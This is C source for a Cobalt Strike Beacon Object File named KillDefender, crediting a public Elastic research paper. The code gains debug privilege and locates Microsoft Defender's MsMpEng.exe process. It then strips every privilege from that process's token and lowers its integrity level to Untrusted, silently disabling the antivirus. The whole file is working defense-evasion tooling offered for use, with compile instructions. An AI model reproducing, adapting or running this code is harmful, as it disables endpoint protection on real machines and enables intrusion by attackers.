////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//      KillDefender BOF
//
//      CREDITS: https://elastic.github.io/security-research/whitepapers/2022/02/02.sandboxing-antimalware-products-for-fun-and-profit/article/
//               https://twitter.com/GabrielLandau
//
//      POWERED BY: https://github.com/pwn1sher/KillDefender
//      AUTHOR: https://twitter.com/cerbersec
//
//      COMPILE WITH: gcc -o KillDefender.o -c KillDefender.c -masm=intel
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include "KillDefender.h"

#include "syscalls.c"

BOOL EnableDebugPrivilege(HANDLE hProcess) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    HANDLE hToken = NULL;

    status = NtOpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken);
    if(!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not open process token: %llx", status);
        return FALSE;
    }

    if(!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {
        BeaconPrintf(CALLBACK_ERROR, "Privilege lookup failed");
        NtClose(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    status = NtAdjustPrivilegesToken(hToken, FALSE, &tp, 0, NULL, 0);
    if(!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to adjust token privileges: %llx", status);
        NtClose(hToken);
        return FALSE;
    }
    NtClose(hToken);
    return TRUE;
}

HANDLE GetProcessHandle(char* process)
{
    HANDLE hProcess = NULL;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if(Process32First(snapshot, &entry) == TRUE)
    {
        while(Process32Next(snapshot, &entry) == TRUE)
        {
            if(_stricmp(entry.szExeFile, process) == 0)
            {
                CLIENT_ID cID;
                cID.UniqueThread = 0;
                cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                NtOpenProcess(&hProcess, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &cID);

                if(hProcess != INVALID_HANDLE_VALUE)
                {
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] Got process ID: %d\n", entry.th32ProcessID);
                    NtClose(snapshot);
                    return hProcess;
                }
                else
                {
                    BeaconPrintf(CALLBACK_ERROR, "Could not find process");
                    NtClose(snapshot);
                    NtClose(hProcess);
                    return INVALID_HANDLE_VALUE;
                }
            }
        }
    }
    NtClose(snapshot);
    return INVALID_HANDLE_VALUE;
}

BOOL SetPrivilege(HANDLE hToken, LPCSTR lpszPrivilege, BOOL bEnablePrivilege) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if(!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        BeaconPrintf(CALLBACK_ERROR, "Privilege lookup failed");
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if(bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
    else
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;

    status = NtAdjustPrivilegesToken(hToken, FALSE, &tp, 0, NULL, 0);
    if(!NT_SUCCESS(status)) {
        if(status == STATUS_NOT_ALL_ASSIGNED) {
            BeaconPrintf(CALLBACK_ERROR, "Token does not have the specified privilege");
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "Failed to adjust token privileges: %llx", status);
        }
        return FALSE;
    }
    return TRUE;
}

void go(char *args, int alen) {
    if(!EnableDebugPrivilege((HANDLE)-1))
        return;

    HANDLE hProcess = GetProcessHandle("MsMpEng.exe");
    if(hProcess == INVALID_HANDLE_VALUE)
        return;

    if(!EnableDebugPrivilege(hProcess))
        return;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Killing Defender");

    //remove token privileges
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    HANDLE hToken = NULL;

    status = NtOpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken);
    if(!NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_ERROR, "Could not open process token: %llx", status);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Removing all privileges");

    SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);
    SetPrivilege(hToken, SE_CHANGE_NOTIFY_NAME, TRUE);
    SetPrivilege(hToken, SE_TCB_NAME, TRUE);
    SetPrivilege(hToken, SE_IMPERSONATE_NAME, TRUE);
    SetPrivilege(hToken, SE_LOAD_DRIVER_NAME, TRUE);
    SetPrivilege(hToken, SE_RESTORE_NAME, TRUE);
    SetPrivilege(hToken, SE_BACKUP_NAME, TRUE);
    SetPrivilege(hToken, SE_SECURITY_NAME, TRUE);
    SetPrivilege(hToken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
    SetPrivilege(hToken, SE_INCREASE_QUOTA_NAME, TRUE);
    SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, TRUE);
    SetPrivilege(hToken, SE_INC_BASE_PRIORITY_NAME, TRUE);
    SetPrivilege(hToken, SE_SHUTDOWN_NAME, TRUE);
    SetPrivilege(hToken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Updating token integrity");

    DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;
    SID integrityLevelSid = {};
    integrityLevelSid.Revision = SID_REVISION;
    integrityLevelSid.SubAuthorityCount = 1;
    integrityLevelSid.IdentifierAuthority.Value[5] = 16;
    integrityLevelSid.SubAuthority[0] = integrityLevel;

    TOKEN_MANDATORY_LABEL tokenIntegrityLevel = {};
    tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;
    tokenIntegrityLevel.Label.Sid = &integrityLevelSid;

    if (!SetTokenInformation(hToken,TokenIntegrityLevel, &tokenIntegrityLevel,sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(&integrityLevelSid))) {
        BeaconPrintf(CALLBACK_ERROR, "SetTokenInformation failed");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Token Integrity set to Untrusted");
    }

    NtClose(hToken);
    NtClose(hProcess);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");
}